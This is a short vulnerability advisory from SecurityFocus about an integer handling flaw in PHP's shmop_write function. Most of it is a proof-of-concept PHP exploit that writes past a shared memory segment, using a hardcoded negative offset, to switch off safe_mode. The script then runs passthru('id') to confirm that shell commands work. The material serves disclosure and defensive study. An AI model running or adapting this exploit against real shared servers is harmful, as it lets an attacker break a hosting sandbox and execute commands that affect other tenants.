source: http://www.securityfocus.com/bid/12045/info

PHP shared memory module (shmop) is reported prone to an integer handling vulnerability. The issue exists in the PHP_FUNCTION(shmop_write) function and is as a result of a lack of sufficient sanitization performed on 'offset' data.

This vulnerability may be exploited to make an almost arbitrary write into process memory. It is reported that the vulnerability may be leveraged to disable PHP 'safe mode', this may result in further compromise in a shared-server environment. 

<?
/*
   Php Safe_mode Bypass Proof of concept.
   
   Copyright 2004 Stefano Di Paola stefano.dipaola[at]wisec.it
   
   Disclaimer: The author is not responsible of any damage this script can cause
   
*/

 $shm_id = shmop_open(0xff2, "c", 0644, 100);
  if (!$shm_id) {
    echo "Couldn't create shared memory segment\n";
    die;
 }

// $data="\x01";
// the new value for safe_mode
 $data="\x00";
 
// this (-3842685) is my offset to reach core_globals.safe_mode
// taken with gdb. (0x40688d83)
 $offset=-3842685;
// Lets write the new value at our offset.
$shm_bytes_written = shmop_write($shm_id, $data, $offset );
if ($shm_bytes_written != strlen($data)) {
   echo "Couldn't write the entire length of data\n";
}

//Now lets delete the block and close the shared memory segment
if (!shmop_delete($shm_id)) {
   echo "Couldn't mark shared memory block for deletion.";
}
shmop_close($shm_id);

// Let's try if safe mode has been set to off
echo passthru("id");
dl("shmop.so");
?>
